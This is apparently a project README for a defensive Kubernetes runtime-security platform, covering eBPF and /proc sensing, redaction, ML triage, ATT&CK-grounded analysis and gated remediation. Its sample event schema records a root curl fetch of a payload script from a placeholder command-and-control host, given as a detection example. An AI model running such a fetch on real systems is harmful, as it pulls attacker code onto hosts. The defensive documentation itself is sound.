# 🛡️ Workload Security

> **Autonomous Cloud-Native Workload Security, eBPF Observability & Closed-Loop Remediation Platform**

[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.11%20%7C%203.12-blue)](https://www.python.org/)
[![React](https://img.shields.io/badge/react-18.x-61dafb)](https://react.dev/)
[![eBPF](https://img.shields.io/badge/instrumentation-eBPF%20%2F%20Tetragon-orange)](https://tetragon.io/)
[![Platform](https://img.shields.io/badge/platform-x86__64%20%7C%20s390x-brightgreen)](https://www.ibm.com/z)

---

## 📌 Overview

**Workload Security** is an end-to-end cloud-native runtime security platform designed to detect, triage, explain, and remediate advanced threats across Kubernetes clusters with microsecond-level latency and zero disruption to production workloads.

Built around a high-performance **eBPF telemetry kernel**, Workload Security replaces legacy, heavyweight monitoring agents with kernel-space syscall observation. It combines **in-stream privacy redaction**, **explainable local machine learning triage**, **agentic MITRE ATT&CK RAG analysis**, and **human-in-the-loop autonomous remediation** into a unified security operations workflow.

```
                                      WORKLOAD SECURITY ARCHITECTURE
  
 ┌───────────────────────────────────────────────────────────────────────────────────────────────────────┐
 │                                      KUBERNETES DATA PLANE                                            │
 │                                                                                                       │
 │   ┌───────────────────────┐       ┌───────────────────────┐       ┌───────────────────────────────┐   │
 │   │  Worker Node (x86/Z)  │       │  Worker Node (x86/Z)  │       │       Attacker / Workload     │   │
 │   │  ┌─────────────────┐  │       │  ┌─────────────────┐  │       │   ┌───────────────────────┐   │   │
 │   │  │ Tetragon (eBPF) │  │       │  │ Tetragon (eBPF) │  │       │   │ Pod / Container Exec  │   │   │
 │   │  └────────┬────────┘  │       │  └────────┬────────┘  │       │   └───────────┬───────────┘   │   │
 └───────────────┼───────────────────────────────┼───────────────────────────────┼───────────────────────┘
                 │ (gRPC :54321 / JSON)          │                               │ Syscall Trace
                 └───────────────────────────────┼───────────────────────────────┘
                                                 │
                                                 ▼
 ┌───────────────────────────────────────────────────────────────────────────────────────────────────────┐
 │                                  STREAM INGESTION & PRIVACY FORWARDER                                 │
 │                                                                                                       │
 │   ┌───────────────────────────┐   ┌───────────────────────────┐   ┌───────────────────────────────┐   │
 │   │   Telemetry Normalizer    │──▶│  Privacy Redaction Engine │──▶│   Local ML Triage (XGBoost)   │   │
 │   │   Unified Event Schema    │   │  HIPAA/PII & Token Mask   │   │   TP / FP / BP Classification │   │
 │   └───────────────────────────┘   └───────────────────────────┘   └───────────────┬───────────────┘   │
 │                                                                                   │                   │
 │                                   FastAPI Engine (:8081)                          │ Enriched Events   │
 └───────────────────────────────────────────────────────────────────────────────────┼───────────────────┘
                                                                                     │
                                                 ┌───────────────────────────────────┘
                                                 ▼
                                     ┌───────────────────────┐
                                     │ Redis Event Streams   │
                                     │   (security:events)   │
                                     └───────────┬───────────┘
                                                 │
                         ┌───────────────────────┴───────────────────────┐
                         ▼                                               ▼
 ┌───────────────────────────────────────────────┐   ┌───────────────────────────────────────────────────┐
 │        SECURITY OPERATIONS COMMAND CENTER     │   │         AGENTIC ORCHESTRATOR & REMEDIATION        │
 │                                               │   │                                                   │
 │   ┌───────────────────────────────────────┐   │   │   ┌───────────────────────────────────────────┐   │
 │   │  React 18 / Vite Command Center UI    │   │   │   │  LangGraph Multi-Agent RAG Orchestrator   │   │
 │   │  (:5173)                              │   │   │   │  Gemini LLM + Pinecone/ChromaDB Vector DB │   │
 │   └───────────────────▲───────────────────┘   │   │   └─────────────────────┬─────────────────────┘   │
 │                       │ SSE / REST            │   │                         │ MITRE ATT&CK Mapping    │
 │   ┌───────────────────┴───────────────────┐   │   │   ┌─────────────────────▼─────────────────────┐   │
 │   │  Dashboard API Server (:8080)         │◀──┼───┼───│  Decision Gate & Remediation Engine       │   │
 │   │  Incident Ledger, Syscalls, Forensics │   │   │   │  Dry-Run Gates, Pod Quarantine, SIGKILL   │   │
 │   └───────────────────────────────────────┘   │   │   └───────────────────────────────────────────┘   │
 └───────────────────────────────────────────────┘   └───────────────────────────────────────────────────┘
```

---

## ✨ Key Capabilities

### 1. ⚡ Deep Kernel-Level eBPF Telemetry
- Inspects `sys_enter_execve`, `sys_enter_connect`, file access, and capability grants in real time directly from the Linux kernel.
- In-kernel policy filtering eliminates user-space context switches for benign traffic.
- Zero-overhead architecture portable across standard **x86_64** cloud nodes and **s390x (IBM Z / LinuxONE)** enterprise mainframes.

### 2. 🔒 Privacy-Preserving Telemetry & In-Stream Redaction
- **Automatic Data Sanitization**: Identifies and masks credentials, API tokens, passwords, authorization headers, and session cookies from process execution arguments.
- **Identity Obfuscation**: Computes deterministic SHA-256 hashes of container IDs, sensitive system usernames, and cluster node names before persisting or feeding external models.
- **Compliance Guardrails**: Zero plaintext leakage of sensitive arguments to downstream LLMs or vector databases.

### 3. 🎯 Explainable Real-Time ML Triage
- Local high-throughput machine learning classifier grades every security telemetry event into:
  - **TP (True Positive)**: Confirmed malicious anomalous execution.
  - **FP (False Positive)**: Routine deployment or cluster orchestration noise.
  - **BP (Benign Profile)**: Expected system binary behaviors.
- Computes statistical confidence scores with explicit feature attribution vectors (parent process lineage, directory traversal score, shell invocation flags), ensuring full operational explainability.

### 4. 🧠 Agentic Threat Analysis & MITRE ATT&CK RAG
- LangGraph-powered orchestration agent grounds runtime events against the complete **MITRE ATT&CK Enterprise Matrix** (`enterprise-attack.json`).
- Semantic vector retrieval (Pinecone / ChromaDB fallback) matches observed syscall sequences with real-world threat actor tactics and techniques (e.g., T1059 Command and Scripting Interpreter, T1071 Application Layer Protocol).
- Automatically synthesizes root-cause analyses, forensic evidence timelines, and human-readable investigation summaries via LLM reasoning.

### 5. 🛡️ Closed-Loop Human-in-the-Loop Remediation
- Configurable autonomous response policies with strict safety controls:
  - **Safe Dry-Run Mode** (`REMEDIATION_DRY_RUN=true`): Simulates and audits actions without mutating cluster state.
  - **Autonomous & Manual Decision Gates**: Configurable confidence thresholds before triggering active enforcement.
- **Multi-Level Containment Actions**:
  - Immediate process termination (`SIGKILL`) for active root privilege escalations.
  - Runtime Kubernetes `NetworkPolicy` generation to isolate compromised pods.
  - Namespace and pod quarantine without impacting adjacent workloads.
- Tamper-evident audit trail persisted in Redis and accessible via dashboard APIs.

### 6. 📊 Modern Security Operations Command Center
- High-density React 18 / Tailwind CSS dashboard designed for SOC operations:
  - **Incident Ledger**: Real-time event stream graded by severity and classification.
  - **Forensics Panel**: Process genealogy trees, parent-child PID hierarchies, and full argument forensics.
  - **Cluster Topology & Syscall Ticker**: Live node-level event telemetry and eBPF tracing policy status.
  - **Attacker Simulation Console**: Built-in test harness for validating threat scenarios and defenses.

---

## 📡 Capture Modes — what is actually observing

Being precise about the sensor is the most important honesty property in this
project. There are three ingestion modes, and they are **not** equivalent.

| Mode | Flag | `capture_mode` | What it sees | Works on `s390x` |
|---|---|---|---|---|
| Fixture replay | `--mode fixture_replay` | `fixture_replay` | Stored records. Not a sensor. | yes |
| Live eBPF | `--mode live_tetragon` | `live_tetragon` | Kernel `execve`/`connect()` as they happen | **no** |
| Live `/proc` | `--mode procfs` | `procfs_live` | Process state on a poll interval | yes |

**Why two "live" modes?** Upstream Tetragon publishes no `linux/s390x`
release and the Datathon LinuxONE instance has no container runtime, so an
eBPF DaemonSet cannot be deployed there. The `/proc` sensor is the
alternative: an unprivileged poller that reads the process table directly.

It is a real sensor and is reported as live, but it is **not eBPF** and never
claims to be:

| | eBPF | `/proc` poll |
|---|---|---|
| Sees `execve` as it happens | yes | no — only a diff on the next poll |
| Sees `connect()` | yes | **no** |
| Misses short-lived processes | no | **yes**, between polls |
| Privileges | privileged + host mounts | unprivileged |

The API reports this as two distinct fields — `sensor_kind` and
`sensor_is_ebpf` — and the UI renders `/proc` capture in its own colour with
a visible "not eBPF" disclosure. A single `LIVE` badge would overstate it.

### `/proc` sensor privacy defaults

A live command-line sensor on a shared host can capture credential-bearing
daemons, so three defaults narrow that exposure:

1. **Kernel threads** are always skipped.
2. **Self-exclusion** — the sensor never observes itself or its ancestors.
3. **`PROCFS_DENYLIST`** — exact match on `/proc/PID/comm`, not the command
   line, so it cannot be evaded by padding argv. Default:
   `sshd,cron,unattended-upgrades,systemd`.

Set `PROCFS_DENYLIST=` for full coverage, which means opting in to capturing
interactive login sessions. Everything the sensor emits still passes through
write-time redaction before it reaches Redis.

---

## 🚀 One-command demo (Windows → LinuxONE)

```powershell
.\scripts\start-demo.ps1
```

Opens an SSH tunnel, waits for the API, prints what the remote actually
reports, and opens **http://localhost:8080**.

The dashboard API serves both the JSON API and the built React bundle, so UI
and API are same-origin — no Vite dev server, no second port. The remote host
has no `node`, so the bundle is built on the workstation:

```powershell
cd dashboard; npm ci; npm run build
```

---

## 🏗️ System Components & Service Ports

| Service | Port | Description | Tech Stack |
|---|---|---|---|
| **Security Dashboard UI** | `5173` | Interactive SOC operations console | React 18, Vite, Tailwind CSS, Lucide |
| **Security Orchestrator API** | `8000` | LangGraph RAG Agent & ATT&CK analysis engine | FastAPI, LangGraph, Google Gemini, Pinecone |
| **Dashboard API** | `8080` | Real-time SSE streaming, incident history, remediation API | Python, FastAPI, Redis client |
| **Event Forwarder API** | `8081` | Tetragon ingest, privacy filter, XGBoost triage | FastAPI, XGBoost, NumPy, scikit-learn |
| **ChromaDB (Optional)** | `8100` | Local vector database fallback for offline RAG | ChromaDB |
| **Redis Stream** | `6379` | High-throughput pub/sub event bus (`security:events`) | Redis 7 Alpine |
| **Attacker Sandbox UI** | `8888` | Safe attack generator for live demonstration | Flask, HTML5 |

---

## 📋 Unified Event Schema

All events normalized across the pipeline conform to the strict Workload Security JSON contract:

```json
{
  "event_id": "4a7f29b1-6a1e-4c7b-91d2-09fb4081c7e2",
  "timestamp": "2026-10-17T18:30:00.124Z",
  "source": "tetragon",
  "event_type": "process_exec",
  "node_name": "worker-node-01",
  "telemetry": {
    "pid": 2841,
    "binary": "/usr/bin/curl",
    "args": ["-s", "http://c2.attacker.com/payload.sh"],
    "uid": 0,
    "user": "root",
    "namespace": "production",
    "pod": "payment-service-7f64b8d9c-2kl8w",
    "container_id": "9b12a84c3d2e",
    "parent_binary": "/bin/bash",
    "parent_pid": 2810
  },
  "triage": {
    "grade": "TP",
    "confidence": 0.94,
    "reason": "Root execution of curl to non-standard external domain from production namespace."
  },
  "explanation": {
    "summary": "Suspicious outbound network egress and payload fetch executed by root inside container.",
    "mitre_technique_id": "T1105",
    "mitre_technique_name": "Ingress Tool Transfer"
  },
  "remediation": {
    "recommended_action": "isolate_pod",
    "dry_run": false,
    "status": "pending_approval"
  }
}
```

---

## 🚀 Quick Start Guide

### Prerequisites
- **Docker Engine** 24.x+ and **Docker Compose** v2
- **Python** 3.11+
- **Node.js** 18+ (for frontend development)
- **kubectl** & **Kind** (optional, for live Kubernetes eBPF cluster testing)

---

### Method 1: Full-Stack Docker Compose (Recommended)

1. **Clone the repository**:
   ```bash
   git clone https://github.com/KarthikR-ts/security-core.git
   cd security-core
   ```

2. **Configure environment credentials**:
   ```bash
   cp .env.example .env
   # Edit .env with your Google Gemini / Pinecone API credentials:
   # GOOGLE_API_KEY=your_key
   # PINECONE_API_KEY=your_key
   ```

3. **Launch the entire platform**:
   ```bash
   docker-compose up --build
   ```

4. **Access the services**:
   - 🖥️ **Command Center UI**: [http://localhost:5173](http://localhost:5173) (or `npm run dev` in `/dashboard`)
   - 🛡️ **Orchestrator API Docs**: [http://localhost:8000/docs](http://localhost:8000/docs)
   - 📊 **Dashboard API Status**: [http://localhost:8080/health](http://localhost:8080/health)
   - ⚡ **Forwarder API & Metrics**: [http://localhost:8081/health](http://localhost:8081/health)

---

### Method 2: Local Python Services & Live Demo Runner

For rapid testing and offline demonstration without setting up a Kubernetes cluster, Workload Security includes a high-fidelity synthetic event generator:

1. **Install Dependencies**:
   ```bash
   python -m venv .venv
   source .venv/bin/activate  # On Windows: .venv\Scripts\activate
   pip install -r requirements.txt
   ```

2. **Run the One-Command Demo Launcher**:
   ```bash
   bash start_app.sh
   # Or run via Makefile
   make forwarder-offline
   ```

3. **Launch the Web Dashboard**:
   ```bash
   cd dashboard
   npm install
   npm run dev
   ```

---

### Method 3: Live Kubernetes Cluster with eBPF Tetragon

To deploy Workload Security on a live Kubernetes cluster with active kernel tracing:

1. **Provision Kind Cluster with Tetragon Tracing Policies**:
   ```bash
   make up
   ```
   *Creates a multi-node Kind cluster and deploys the Tetragon eBPF DaemonSet with process and network probes.*

2. **Stream Live Events into Forwarder**:
   ```bash
   make port-forward
   make forwarder
   ```

3. **Simulate a Benign Workload Attack**:
   ```bash
   make demo
   ```

4. **Tear Down**:
   ```bash
   make down
   ```

---

## 📡 API Reference Overview

### Orchestrator API (`:8000`)
- `GET /` — Service health and metadata
- `POST /analyze` — Submit security event for full LangGraph RAG reasoning and ATT&CK mapping
- `GET /health` — Health check for LLM, vector store, and dependencies
- `POST /ingest` — Ingest external security reports or threat intelligence into the vector DB

### Dashboard API (`:8080`)
- `GET /` — Built React bundle (when `dashboard/dist` is present), else a JSON pointer
- `GET /api/health` — Status, components, and truthful platform/sensor block
- `GET /api/procs` — Live process snapshot read from `/proc` on this host
- `GET /api/system` — Load, uptime, memory, kernel, architecture
- `GET /api/events` — Enriched event list for the incident ledger
- `GET /api/metrics` — Aggregated metrics and severity breakdown
- `WS /api/ws/events` — Real-time event push
- `POST /api/remediation/approve` — Human-in-the-loop approval gate
- `GET /api/explain/{event_id}` — Explanation and provenance for an event

### Forwarder API (`:8081`)
- `GET /health` — Event forwarder and Redis connection status
- `GET /metrics` — Prometheus metrics (events/sec, dropped packets, triage latencies)
- `POST /triage` — Direct ML classification of incoming JSON event
- `POST /security/analyze` — Unified endpoint combining normalisation, privacy redaction, and ML triage
- `POST /privacy/redact` — Standalone test endpoint for privacy and PII masking

---

## ⚙️ Environment Configuration

| Variable | Default | Purpose |
|---|---|---|
| `GOOGLE_API_KEY` | — | Google Gemini LLM API key for threat analysis |
| `PINECONE_API_KEY` | — | Pinecone API key for ATT&CK vector search |
| `PINECONE_INDEX_NAME` | `security-knowledge` | Vector index name for security knowledge |
| `REDIS_HOST` | `localhost` | Redis host for streaming event bus |
| `REDIS_PORT` | `6379` | Redis port |
| `REDIS_STREAM_KEY` | `security:events` | Redis stream key for unified events |
| `REMEDIATION_DRY_RUN` | `true` | If true, logs remediation actions without executing them |
| `REMEDIATION_AUTONOMY_MODE` | `manual` | Mode: `manual` (approval needed) or `autonomous` |
| `REMEDIATION_SIGKILL_THRESHOLD` | `0.85` | Confidence score required to trigger SIGKILL containment |
| `REMEDIATION_YAML_THRESHOLD` | `0.75` | Confidence score required for NetworkPolicy quarantine |
| `OFFLINE_MODE` | `false` | Enable offline synthetic event replay |

---

## 🧪 Testing & Quality Assurance

Run the comprehensive test suite covering normalisation, privacy filters, ML triage, and orchestrator pipelines:

```bash
# Run all unit and integration tests
pytest forwarder/tests tests/ -v

# Run privacy redaction tests specifically
pytest forwarder/tests/test_privacy.py -v

# Run schema normalisation tests
pytest forwarder/tests/test_transformer.py -v
```

---

## 👥 Architecture & Contribution

Workload Security is built with modularity in mind:
- **`forwarder/`**: High-performance ingest pipeline, sanitization, and machine learning triage.
- **`remediation/`**: Resilient decision gates, Kubernetes executor, and tamper-proof audit trails.
- **`dashboard/`**: Responsive, operator-centric visual command center.
- **`orchestrator.py`**: State machine coordinating semantic threat search and LLM synthesis.
- **`policies/`**: Validated eBPF Tetragon TracingPolicies for Linux kernel instrumentation.

---

## 📄 License

Distributed under the Apache 2.0 License. See `LICENSE` for details.
